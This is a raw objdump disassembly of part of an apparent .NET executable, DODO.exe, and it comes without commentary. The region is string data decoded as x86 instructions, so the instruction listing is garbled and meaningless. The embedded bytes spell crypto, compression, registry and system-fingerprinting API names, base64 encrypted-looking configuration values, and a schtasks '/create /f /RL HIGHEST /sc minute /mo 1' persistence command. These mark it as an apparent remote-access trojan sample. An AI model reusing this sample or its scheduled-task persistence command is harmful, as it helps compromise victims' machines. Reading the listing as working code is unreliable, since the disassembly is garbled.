  40a5a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5a1:	72 00                	jb     0x40a5a3
  40a5a3:	54                   	push   %esp
  40a5a4:	72 61                	jb     0x40a607
  40a5a6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5a7:	73 66                	jae    0x40a60f
  40a5a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5aa:	72 6d                	jb     0x40a619
  40a5ac:	46                   	inc    %esi
  40a5ad:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  40a5b4:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a5b7:	67 65 74 5f          	addr16 gs je 0x40a61a
  40a5bb:	46                   	inc    %esi
  40a5bc:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40a5c3:	00 
  40a5c4:	55                   	push   %ebp
  40a5c5:	72 69                	jb     0x40a630
  40a5c7:	00 55 72             	add    %dl,0x72(%ebp)
  40a5ca:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40a5d1:	6d                   	insl   (%dx),%es:(%edi)
  40a5d2:	65 54                	gs push %esp
  40a5d4:	79 70                	jns    0x40a646
  40a5d6:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40a5da:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  40a5de:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5df:	73 74                	jae    0x40a655
  40a5e1:	4e                   	dec    %esi
  40a5e2:	61                   	popa
  40a5e3:	6d                   	insl   (%dx),%es:(%edi)
  40a5e4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40a5e8:	74 5f                	je     0x40a649
  40a5ea:	43                   	inc    %ebx
  40a5eb:	68 61 72 73 00       	push   $0x737261
  40a5f0:	53                   	push   %ebx
  40a5f1:	69 7a 65 4f 66 00 67 	imul   $0x6700664f,0x65(%edx),%edi
  40a5f8:	65 74 5f             	gs je  0x40a65a
  40a5fb:	54                   	push   %esp
  40a5fc:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  40a603:	74 00                	je     0x40a605
  40a605:	47                   	inc    %edi
  40a606:	65 74 53             	gs je  0x40a65c
  40a609:	74 72                	je     0x40a67d
  40a60b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40a612:	5f                   	pop    %edi
  40a613:	50                   	push   %eax
  40a614:	72 6f                	jb     0x40a685
  40a616:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a619:	73 6f                	jae    0x40a68a
  40a61b:	72 43                	jb     0x40a660
  40a61d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a61e:	75 6e                	jne    0x40a68e
  40a620:	74 00                	je     0x40a622
  40a622:	67 65 74 5f          	addr16 gs je 0x40a685
  40a626:	53                   	push   %ebx
  40a627:	79 73                	jns    0x40a69c
  40a629:	74 65                	je     0x40a690
  40a62b:	6d                   	insl   (%dx),%es:(%edi)
  40a62c:	44                   	inc    %esp
  40a62d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40a634:	79 00                	jns    0x40a636
  40a636:	47                   	inc    %edi
  40a637:	65 74 50             	gs je  0x40a68a
  40a63a:	61                   	popa
  40a63b:	74 68                	je     0x40a6a5
  40a63d:	52                   	push   %edx
  40a63e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a63f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a640:	74 00                	je     0x40a642
  40a642:	67 65 74 5f          	addr16 gs je 0x40a6a5
  40a646:	54                   	push   %esp
  40a647:	6f                   	outsl  %ds:(%esi),(%dx)
  40a648:	74 61                	je     0x40a6ab
  40a64a:	6c                   	insb   (%dx),%es:(%edi)
  40a64b:	53                   	push   %ebx
  40a64c:	69 7a 65 00 49 6e 74 	imul   $0x746e4900,0x65(%edx),%edi
  40a653:	36 34 00             	ss xor $0x0,%al
  40a656:	67 65 74 5f          	addr16 gs je 0x40a6b9
  40a65a:	41                   	inc    %ecx
  40a65b:	53                   	push   %ebx
  40a65c:	43                   	inc    %ebx
  40a65d:	49                   	dec    %ecx
  40a65e:	49                   	dec    %ecx
  40a65f:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  40a663:	70 70                	jo     0x40a6d5
  40a665:	65 72 00             	gs jb  0x40a668
  40a668:	52                   	push   %edx
  40a669:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40a670:	4b 65 
  40a672:	79 50                	jns    0x40a6c4
  40a674:	65 72 6d             	gs jb  0x40a6e4
  40a677:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  40a67e:	68 65 63 6b 00       	push   $0x6b6365
  40a683:	43                   	inc    %ebx
  40a684:	72 65                	jb     0x40a6eb
  40a686:	61                   	popa
  40a687:	74 65                	je     0x40a6ee
  40a689:	53                   	push   %ebx
  40a68a:	75 62                	jne    0x40a6ee
  40a68c:	4b                   	dec    %ebx
  40a68d:	65 79 00             	gs jns 0x40a690
  40a690:	52                   	push   %edx
  40a691:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  40a698:	56 61 
  40a69a:	6c                   	insb   (%dx),%es:(%edi)
  40a69b:	75 65                	jne    0x40a702
  40a69d:	4b                   	dec    %ebx
  40a69e:	69 6e 64 00 42 69 74 	imul   $0x74694200,0x64(%esi),%ebp
  40a6a5:	43                   	inc    %ebx
  40a6a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6a8:	76 65                	jbe    0x40a70f
  40a6aa:	72 74                	jb     0x40a720
  40a6ac:	65 72 00             	gs jb  0x40a6af
  40a6af:	53                   	push   %ebx
  40a6b0:	79 73                	jns    0x40a725
  40a6b2:	74 65                	je     0x40a719
  40a6b4:	6d                   	insl   (%dx),%es:(%edi)
  40a6b5:	2e 49                	cs dec %ecx
  40a6b7:	4f                   	dec    %edi
  40a6b8:	2e 43                	cs inc %ebx
  40a6ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6bb:	6d                   	insl   (%dx),%es:(%edi)
  40a6bc:	70 72                	jo     0x40a730
  40a6be:	65 73 73             	gs jae 0x40a734
  40a6c1:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  40a6c8:	70 53                	jo     0x40a71d
  40a6ca:	74 72                	je     0x40a73e
  40a6cc:	65 61                	gs popa
  40a6ce:	6d                   	insl   (%dx),%es:(%edi)
  40a6cf:	00 43 6f             	add    %al,0x6f(%ebx)
  40a6d2:	6d                   	insl   (%dx),%es:(%edi)
  40a6d3:	70 72                	jo     0x40a747
  40a6d5:	65 73 73             	gs jae 0x40a74b
  40a6d8:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  40a6df:	00 53 75             	add    %dl,0x75(%ebx)
  40a6e2:	62 74 72 61          	bound  %esi,0x61(%edx,%esi,2)
  40a6e6:	63 74 4f 62          	arpl   %esi,0x62(%edi,%ecx,2)
  40a6ea:	6a 65                	push   $0x65
  40a6ec:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40a6f0:	72 65                	jb     0x40a757
  40a6f2:	61                   	popa
  40a6f3:	74 65                	je     0x40a75a
  40a6f5:	45                   	inc    %ebp
  40a6f6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6f7:	63 72 79             	arpl   %esi,0x79(%edx)
  40a6fa:	70 74                	jo     0x40a770
  40a6fc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6fd:	72 00                	jb     0x40a6ff
  40a6ff:	53                   	push   %ebx
  40a700:	48                   	dec    %eax
  40a701:	43                   	inc    %ebx
  40a702:	6f                   	outsl  %ds:(%esi),(%dx)
  40a703:	72 65                	jb     0x40a76a
  40a705:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a708:	6c                   	insb   (%dx),%es:(%edi)
  40a709:	00 53 74             	add    %dl,0x74(%ebx)
  40a70c:	72 75                	jb     0x40a783
  40a70e:	63 74 4c 61          	arpl   %esi,0x61(%esp,%ecx,2)
  40a712:	79 6f                	jns    0x40a783
  40a714:	75 74                	jne    0x40a78a
  40a716:	41                   	inc    %ecx
  40a717:	74 74                	je     0x40a78d
  40a719:	72 69                	jb     0x40a784
  40a71b:	62 75 74             	bound  %esi,0x74(%ebp)
  40a71e:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  40a723:	6f                   	outsl  %ds:(%esi),(%dx)
  40a724:	75 74                	jne    0x40a79a
  40a726:	4b                   	dec    %ebx
  40a727:	69 6e 64 00 43 6f 6d 	imul   $0x6d6f4300,0x64(%esi),%ebp
  40a72e:	70 69                	jo     0x40a799
  40a730:	6c                   	insb   (%dx),%es:(%edi)
  40a731:	61                   	popa
  40a732:	74 69                	je     0x40a79d
  40a734:	6f                   	outsl  %ds:(%esi),(%dx)
  40a735:	6e                   	outsb  %ds:(%esi),(%dx)
  40a736:	52                   	push   %edx
  40a737:	65 6c                	gs insb (%dx),%es:(%edi)
  40a739:	61                   	popa
  40a73a:	78 61                	js     0x40a79d
  40a73c:	74 69                	je     0x40a7a7
  40a73e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a73f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a740:	73 41                	jae    0x40a783
  40a742:	74 74                	je     0x40a7b8
  40a744:	72 69                	jb     0x40a7af
  40a746:	62 75 74             	bound  %esi,0x74(%ebp)
  40a749:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40a74d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a74e:	74 69                	je     0x40a7b9
  40a750:	6d                   	insl   (%dx),%es:(%edi)
  40a751:	65 43                	gs inc %ebx
  40a753:	6f                   	outsl  %ds:(%esi),(%dx)
  40a754:	6d                   	insl   (%dx),%es:(%edi)
  40a755:	70 61                	jo     0x40a7b8
  40a757:	74 69                	je     0x40a7c2
  40a759:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40a75c:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40a763:	69 
  40a764:	62 75 74             	bound  %esi,0x74(%ebp)
  40a767:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  40a76b:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  40a772:	62 
  40a773:	75 74                	jne    0x40a7e9
  40a775:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a779:	73 65                	jae    0x40a7e0
  40a77b:	6d                   	insl   (%dx),%es:(%edi)
  40a77c:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40a780:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40a787:	69 
  40a788:	6f                   	outsl  %ds:(%esi),(%dx)
  40a789:	6e                   	outsb  %ds:(%esi),(%dx)
  40a78a:	41                   	inc    %ecx
  40a78b:	74 74                	je     0x40a801
  40a78d:	72 69                	jb     0x40a7f8
  40a78f:	62 75 74             	bound  %esi,0x74(%ebp)
  40a792:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a796:	73 65                	jae    0x40a7fd
  40a798:	6d                   	insl   (%dx),%es:(%edi)
  40a799:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40a79d:	72 61                	jb     0x40a800
  40a79f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40a7a2:	61                   	popa
  40a7a3:	72 6b                	jb     0x40a810
  40a7a5:	41                   	inc    %ecx
  40a7a6:	74 74                	je     0x40a81c
  40a7a8:	72 69                	jb     0x40a813
  40a7aa:	62 75 74             	bound  %esi,0x74(%ebp)
  40a7ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a7b1:	73 65                	jae    0x40a818
  40a7b3:	6d                   	insl   (%dx),%es:(%edi)
  40a7b4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40a7b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7b9:	70 79                	jo     0x40a834
  40a7bb:	72 69                	jb     0x40a826
  40a7bd:	67 68 74 41 74 74    	addr16 push $0x74744174
  40a7c3:	72 69                	jb     0x40a82e
  40a7c5:	62 75 74             	bound  %esi,0x74(%ebp)
  40a7c8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a7cc:	73 65                	jae    0x40a833
  40a7ce:	6d                   	insl   (%dx),%es:(%edi)
  40a7cf:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40a7d3:	72 6f                	jb     0x40a844
  40a7d5:	64 75 63             	fs jne 0x40a83b
  40a7d8:	74 41                	je     0x40a81b
  40a7da:	74 74                	je     0x40a850
  40a7dc:	72 69                	jb     0x40a847
  40a7de:	62 75 74             	bound  %esi,0x74(%ebp)
  40a7e1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a7e5:	73 65                	jae    0x40a84c
  40a7e7:	6d                   	insl   (%dx),%es:(%edi)
  40a7e8:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40a7ec:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7ed:	6d                   	insl   (%dx),%es:(%edi)
  40a7ee:	70 61                	jo     0x40a851
  40a7f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7f1:	79 41                	jns    0x40a834
  40a7f3:	74 74                	je     0x40a869
  40a7f5:	72 69                	jb     0x40a860
  40a7f7:	62 75 74             	bound  %esi,0x74(%ebp)
  40a7fa:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a7fe:	73 65                	jae    0x40a865
  40a800:	6d                   	insl   (%dx),%es:(%edi)
  40a801:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40a805:	65 73 63             	gs jae 0x40a86b
  40a808:	72 69                	jb     0x40a873
  40a80a:	70 74                	jo     0x40a880
  40a80c:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40a813:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40a81a:	73 73                	jae    0x40a88f
  40a81c:	65 6d                	gs insl (%dx),%es:(%edi)
  40a81e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40a822:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40a829:	72 
  40a82a:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40a831:	4f                   	dec    %edi
  40a832:	44                   	inc    %esp
  40a833:	4f                   	dec    %edi
  40a834:	00 44 4f 44          	add    %al,0x44(%edi,%ecx,2)
  40a838:	4f                   	dec    %edi
  40a839:	2e 65 78 65          	cs js,pn 0x40a8a2
  40a83d:	00 00                	add    %al,(%eax)
  40a83f:	00 00                	add    %al,(%eax)
  40a841:	59                   	pop    %ecx
  40a842:	52                   	push   %edx
  40a843:	00 46 00             	add    %al,0x0(%esi)
  40a846:	77 00                	ja     0x40a848
  40a848:	2f                   	das
  40a849:	00 38                	add    %bh,(%eax)
  40a84b:	00 69 00             	add    %ch,0x0(%ecx)
  40a84e:	33 00                	xor    (%eax),%eax
  40a850:	6a 00                	push   $0x0
  40a852:	6b 00 41             	imul   $0x41,(%eax),%eax
  40a855:	00 6a 00             	add    %ch,0x0(%edx)
  40a858:	39 00                	cmp    %eax,(%eax)
  40a85a:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a85d:	00 30                	add    %dh,(%eax)
  40a85f:	00 70 00             	add    %dh,0x0(%eax)
  40a862:	32 00                	xor    (%eax),%al
  40a864:	75 00                	jne    0x40a866
  40a866:	7a 00                	jp     0x40a868
  40a868:	4b                   	dec    %ebx
  40a869:	00 61 00             	add    %ah,0x0(%ecx)
  40a86c:	41                   	inc    %ecx
  40a86d:	00 35 00 45 00 6f    	add    %dh,0x6f004500
  40a873:	00 76 00             	add    %dh,0x0(%esi)
  40a876:	30 00                	xor    %al,(%eax)
  40a878:	79 00                	jns    0x40a87a
  40a87a:	54                   	push   %esp
  40a87b:	00 76 00             	add    %dh,0x0(%esi)
  40a87e:	42                   	inc    %edx
  40a87f:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a883:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a887:	00 72 00             	add    %dh,0x0(%edx)
  40a88a:	31 00                	xor    %eax,(%eax)
  40a88c:	61                   	popa
  40a88d:	00 75 00             	add    %dh,0x0(%ebp)
  40a890:	43                   	inc    %ebx
  40a891:	00 4d 00             	add    %cl,0x0(%ebp)
  40a894:	58                   	pop    %eax
  40a895:	00 77 00             	add    %dh,0x0(%edi)
  40a898:	3d 00 00 31 79       	cmp    $0x79310000,%eax
  40a89d:	00 4f 00             	add    %cl,0x0(%edi)
  40a8a0:	43                   	inc    %ebx
  40a8a1:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a8a5:	00 50 00             	add    %dl,0x0(%eax)
  40a8a8:	50                   	push   %eax
  40a8a9:	00 38                	add    %bh,(%eax)
  40a8ab:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8ae:	79 00                	jns    0x40a8b0
  40a8b0:	33 00                	xor    (%eax),%eax
  40a8b2:	2f                   	das
  40a8b3:	00 70 00             	add    %dh,0x0(%eax)
  40a8b6:	37                   	aaa
  40a8b7:	00 62 00             	add    %ah,0x0(%edx)
  40a8ba:	59                   	pop    %ecx
  40a8bb:	00 37                	add    %dh,(%edi)
  40a8bd:	00 56 00             	add    %dl,0x0(%esi)
  40a8c0:	6a 00                	push   $0x0
  40a8c2:	50                   	push   %eax
  40a8c3:	00 57 00             	add    %dl,0x0(%edi)
  40a8c6:	51                   	push   %ecx
  40a8c7:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a8cd:	31 6d 00             	xor    %ebp,0x0(%ebp)
  40a8d0:	37                   	aaa
  40a8d1:	00 42 00             	add    %al,0x0(%edx)
  40a8d4:	37                   	aaa
  40a8d5:	00 52 00             	add    %dl,0x0(%edx)
  40a8d8:	58                   	pop    %eax
  40a8d9:	00 76 00             	add    %dh,0x0(%esi)
  40a8dc:	6c                   	insb   (%dx),%es:(%edi)
  40a8dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8e0:	6b 00 67             	imul   $0x67,(%eax),%eax
  40a8e3:	00 2b                	add    %ch,(%ebx)
  40a8e5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8e8:	74 00                	je     0x40a8ea
  40a8ea:	43                   	inc    %ebx
  40a8eb:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8ee:	74 00                	je     0x40a8f0
  40a8f0:	37                   	aaa
  40a8f1:	00 78 00             	add    %bh,0x0(%eax)
  40a8f4:	4c                   	dec    %esp
  40a8f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a8f8:	41                   	inc    %ecx
  40a8f9:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a8ff:	31 4d 00             	xor    %ecx,0x0(%ebp)
  40a902:	51                   	push   %ecx
  40a903:	00 4a 00             	add    %cl,0x0(%edx)
  40a906:	39 00                	cmp    %eax,(%eax)
  40a908:	78 00                	js     0x40a90a
  40a90a:	7a 00                	jp     0x40a90c
  40a90c:	59                   	pop    %ecx
  40a90d:	00 4a 00             	add    %cl,0x0(%edx)
  40a910:	71 00                	jno    0x40a912
  40a912:	6e                   	outsb  %ds:(%esi),(%dx)
  40a913:	00 57 00             	add    %dl,0x0(%edi)
  40a916:	30 00                	xor    %al,(%eax)
  40a918:	54                   	push   %esp
  40a919:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40a91d:	00 73 00             	add    %dh,0x0(%ebx)
  40a920:	4d                   	dec    %ebp
  40a921:	00 45 00             	add    %al,0x0(%ebp)
  40a924:	6d                   	insl   (%dx),%es:(%edi)
  40a925:	00 48 00             	add    %cl,0x0(%eax)
  40a928:	56                   	push   %esi
  40a929:	00 67 00             	add    %ah,0x0(%edi)
  40a92c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a931:	03 31                	add    (%ecx),%esi
  40a933:	00 00                	add    %al,(%eax)
  40a935:	31 32                	xor    %esi,(%edx)
  40a937:	00 4d 00             	add    %cl,0x0(%ebp)
  40a93a:	72 00                	jb     0x40a93c
  40a93c:	67 00 37             	add    %dh,(%bx)
  40a93f:	00 45 00             	add    %al,0x0(%ebp)
  40a942:	58                   	pop    %eax
  40a943:	00 5a 00             	add    %bl,0x0(%edx)
  40a946:	34 00                	xor    $0x0,%al
  40a948:	45                   	inc    %ebp
  40a949:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a94c:	68 00 63 00 4d       	push   $0x4d006300
  40a951:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a955:	00 53 00             	add    %dl,0x0(%ebx)
  40a958:	75 00                	jne    0x40a95a
  40a95a:	39 00                	cmp    %eax,(%eax)
  40a95c:	51                   	push   %ecx
  40a95d:	00 32                	add    %dh,(%edx)
  40a95f:	00 67 00             	add    %ah,0x0(%edi)
  40a962:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a967:	31 2b                	xor    %ebp,(%ebx)
  40a969:	00 33                	add    %dh,(%ebx)
  40a96b:	00 58 00             	add    %bl,0x0(%eax)
  40a96e:	70 00                	jo     0x40a970
  40a970:	4b                   	dec    %ebx
  40a971:	00 4f 00             	add    %cl,0x0(%edi)
  40a974:	4e                   	dec    %esi
  40a975:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a978:	51                   	push   %ecx
  40a979:	00 68 00             	add    %ch,0x0(%eax)
  40a97c:	54                   	push   %esp
  40a97d:	00 62 00             	add    %ah,0x0(%edx)
  40a980:	72 00                	jb     0x40a982
  40a982:	34 00                	xor    $0x0,%al
  40a984:	74 00                	je     0x40a986
  40a986:	72 00                	jb     0x40a988
  40a988:	45                   	inc    %ebp
  40a989:	00 57 00             	add    %dl,0x0(%edi)
  40a98c:	6d                   	insl   (%dx),%es:(%edi)
  40a98d:	00 48 00             	add    %cl,0x0(%eax)
  40a990:	62 00                	bound  %eax,(%eax)
  40a992:	51                   	push   %ecx
  40a993:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a999:	31 6b 00             	xor    %ebp,0x0(%ebx)
  40a99c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a99d:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40a9a1:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a9a5:	00 69 00             	add    %ch,0x0(%ecx)
  40a9a8:	32 00                	xor    (%eax),%al
  40a9aa:	68 00 45 00 76       	push   $0x76004500
  40a9af:	00 2b                	add    %ch,(%ebx)
  40a9b1:	00 73 00             	add    %dh,0x0(%ebx)
  40a9b4:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40a9b8:	79 00                	jns    0x40a9ba
  40a9ba:	75 00                	jne    0x40a9bc
  40a9bc:	59                   	pop    %ecx
  40a9bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a9c0:	52                   	push   %edx
  40a9c1:	00 77 00             	add    %dh,0x0(%edi)
  40a9c4:	67 00 3d             	add    %bh,(%di)
  40a9c7:	00 3d 00 00 21 53    	add    %bh,0x53210000
  40a9cd:	00 63 00             	add    %ah,0x0(%ebx)
  40a9d0:	35 00 4b 00 56       	xor    $0x56004b00,%eax
  40a9d5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9d8:	6d                   	insl   (%dx),%es:(%edi)
  40a9d9:	00 41 00             	add    %al,0x0(%ecx)
  40a9dc:	41                   	inc    %ecx
  40a9dd:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a9e1:	00 53 00             	add    %dl,0x0(%ebx)
  40a9e4:	45                   	inc    %ebp
  40a9e5:	00 38                	add    %bh,(%eax)
  40a9e7:	00 36                	add    %dh,(%esi)
  40a9e9:	00 41 00             	add    %al,0x0(%ecx)
  40a9ec:	00 09                	add    %cl,(%ecx)
  40a9ee:	74 00                	je     0x40a9f0
  40a9f0:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a9f4:	70 00                	jo     0x40a9f6
  40a9f6:	00 11                	add    %dl,(%ecx)
  40a9f8:	5c                   	pop    %esp
  40a9f9:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a9fd:	00 67 00             	add    %ah,0x0(%edi)
  40aa00:	2e 00 74 00 6d       	add    %dh,%cs:0x6d(%eax,%eax,1)
  40aa05:	00 70 00             	add    %dh,0x0(%eax)
  40aa08:	00 03                	add    %al,(%ebx)
  40aa0a:	5c                   	pop    %esp
  40aa0b:	00 00                	add    %al,(%eax)
  40aa0d:	19 73 00             	sbb    %esi,0x0(%ebx)
  40aa10:	63 00                	arpl   %eax,(%eax)
  40aa12:	68 00 74 00 61       	push   $0x61007400
  40aa17:	00 73 00             	add    %dh,0x0(%ebx)
  40aa1a:	6b 00 73             	imul   $0x73,(%eax),%eax
  40aa1d:	00 2e                	add    %ch,(%esi)
  40aa1f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa22:	78 00                	js     0x40aa24
  40aa24:	65 00 00             	add    %al,%gs:(%eax)
  40aa27:	5b                   	pop    %ebx
  40aa28:	2f                   	das
  40aa29:	00 63 00             	add    %ah,0x0(%ebx)
  40aa2c:	72 00                	jb     0x40aa2e
  40aa2e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40aa32:	74 00                	je     0x40aa34
  40aa34:	65 00 20             	add    %ah,%gs:(%eax)
  40aa37:	00 2f                	add    %ch,(%edi)
  40aa39:	00 66 00             	add    %ah,0x0(%esi)
  40aa3c:	20 00                	and    %al,(%eax)
  40aa3e:	2f                   	das
  40aa3f:	00 52 00             	add    %dl,0x0(%edx)
  40aa42:	4c                   	dec    %esp
  40aa43:	00 20                	add    %ah,(%eax)
  40aa45:	00 48 00             	add    %cl,0x0(%eax)
  40aa48:	49                   	dec    %ecx
  40aa49:	00 47 00             	add    %al,0x0(%edi)
  40aa4c:	48                   	dec    %eax
  40aa4d:	00 45 00             	add    %al,0x0(%ebp)
  40aa50:	53                   	push   %ebx
  40aa51:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40aa55:	00 2f                	add    %ch,(%edi)
  40aa57:	00 73 00             	add    %dh,0x0(%ebx)
  40aa5a:	63 00                	arpl   %eax,(%eax)
  40aa5c:	20 00                	and    %al,(%eax)
  40aa5e:	6d                   	insl   (%dx),%es:(%edi)
  40aa5f:	00 69 00             	add    %ch,0x0(%ecx)
  40aa62:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa63:	00 75 00             	add    %dh,0x0(%ebp)
  40aa66:	74 00                	je     0x40aa68
  40aa68:	65 00 20             	add    %ah,%gs:(%eax)
  40aa6b:	00 2f                	add    %ch,(%edi)
  40aa6d:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa70:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa71:	00 20                	add    %ah,(%eax)
  40aa73:	00 31                	add    %dh,(%ecx)
  40aa75:	00 20                	add    %ah,(%eax)
  40aa77:	00 2f                	add    %ch,(%edi)
  40aa79:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40aa7d:	00 20                	add    %ah,(%eax)
  40aa7f:	00 22                	add    %ah,(%edx)
  40aa81:	00 00                	add    %al,(%eax)
  40aa83:	0f 22 00             	mov    %eax,%cr0
  40aa86:	20 00                	and    %al,(%eax)
  40aa88:	2f                   	das
  40aa89:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40aa8d:	00 20                	add    %ah,(%eax)
  40aa8f:	00 22                	add    %ah,(%edx)
  40aa91:	00 00                	add    %al,(%eax)
  40aa93:	03 22                	add    (%edx),%esp
  40aa95:	00 00                	add    %al,(%eax)
  40aa97:	43                   	inc    %ebx
  40aa98:	2f                   	das
  40aa99:	00 63 00             	add    %ah,0x0(%ebx)
  40aa9c:	72 00                	jb     0x40aa9e
  40aa9e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40aaa2:	74 00                	je     0x40aaa4
  40aaa4:	65 00 20             	add    %ah,%gs:(%eax)
  40aaa7:	00 2f                	add    %ch,(%edi)
  40aaa9:	00 66 00             	add    %ah,0x0(%esi)
  40aaac:	20 00                	and    %al,(%eax)
  40aaae:	2f                   	das
  40aaaf:	00 73 00             	add    %dh,0x0(%ebx)
  40aab2:	63 00                	arpl   %eax,(%eax)
  40aab4:	20 00                	and    %al,(%eax)
  40aab6:	6d                   	insl   (%dx),%es:(%edi)
  40aab7:	00 69 00             	add    %ch,0x0(%ecx)
  40aaba:	6e                   	outsb  %ds:(%esi),(%dx)
  40aabb:	00 75 00             	add    %dh,0x0(%ebp)
  40aabe:	74 00                	je     0x40aac0
  40aac0:	65 00 20             	add    %ah,%gs:(%eax)
  40aac3:	00 2f                	add    %ch,(%edi)
  40aac5:	00 6d 00             	add    %ch,0x0(%ebp)
  40aac8:	6f                   	outsl  %ds:(%esi),(%dx)
  40aac9:	00 20                	add    %ah,(%eax)
  40aacb:	00 31                	add    %dh,(%ecx)
  40aacd:	00 20                	add    %ah,(%eax)
  40aacf:	00 2f                	add    %ch,(%edi)
  40aad1:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40aad5:	00 20                	add    %ah,(%eax)
  40aad7:	00 22                	add    %ah,(%edx)
  40aad9:	00 00                	add    %al,(%eax)
  40aadb:	5b                   	pop    %ebx
  40aadc:	53                   	push   %ebx
  40aadd:	00 4f 00             	add    %cl,0x0(%edi)
